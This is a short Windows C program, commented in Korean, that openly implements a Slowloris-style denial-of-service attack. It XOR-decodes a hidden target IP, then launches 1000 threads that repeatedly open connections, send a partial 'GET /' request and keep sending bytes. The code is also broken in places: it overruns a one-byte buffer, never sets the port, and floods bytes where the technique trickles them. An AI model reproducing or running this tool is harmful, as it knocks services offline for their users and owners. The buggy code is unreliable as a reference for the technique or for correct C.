#include <stdio.h>
#include <WinSock2.h>

#pragma comment(lib, "ws2_32.lib")

DWORD WINAPI SlowlorisThread(PVOID p)
{
	SOCKET s;
	sockaddr_in* victim;

	// 패킷에 담을 내용
	char header[] = "GET /";
	char a = 'A';
	int n;

	victim = (sockaddr_in*)p;
	while (1)  // socket 생성 후 접속 시도하고 헤더를 보냄.
	{
		s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if (s != INVALID_SOCKET)
		{
			connect(s, (sockaddr*)victim, sizeof(sockaddr_in));
			send(s, header, sizeof(header) - 1, 0);
			while (1)
			{
				n = send(s, &a, 1, 0);
				if (n == SOCKET_ERROR)
				{
					break;
				}
			}
			Sleep(100);
		}
	}
}

int main()
{	
	WSADATA WD;
	ULONG i;
	hostent* host;
	sockaddr_in victim;

	WSAStartup(0x202, &WD);

	char victim_ip[] = "PXSOPWYOPQOP";
	int len;
	len = strlen(victim_ip);
	char dec_ip[] = "";
	for (i = 0; i < len; i++)
	{
		dec_ip[i] = victim_ip[i] ^ 'a';
		if (i == len - 1)
		{
			dec_ip[i + 1] = '\0';
		}
	}
	host = gethostbyname(dec_ip);
	victim.sin_family = AF_INET;
	victim.sin_addr.S_un.S_addr = *(PULONG)host->h_addr;

	printf("\nCteating thrade for slowloris attack\n");
	for (i = 0; i < 1000; i++)
	{
		CreateThread(NULL, 0, SlowlorisThread, &victim, 0, NULL);
	}

	printf("\nAttack started");
	printf("\nPlease enter anykey to stop attack");
	getchar();

	
	return 0;
}
